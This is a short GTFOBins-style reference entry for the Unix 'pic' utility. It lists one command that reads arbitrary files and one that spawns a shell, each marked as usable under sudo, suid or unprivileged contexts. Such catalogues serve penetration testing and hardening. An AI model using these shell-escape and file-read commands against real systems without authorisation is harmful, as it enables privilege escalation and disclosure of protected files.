---
type: gtfobin
name: pic
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# pic

## file-read

```bash
pic /path/to/input-file
```
_The output is prefixed with some content._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
pic -U
.PS
sh X sh X
```
**Contexts:** sudo, suid, unprivileged
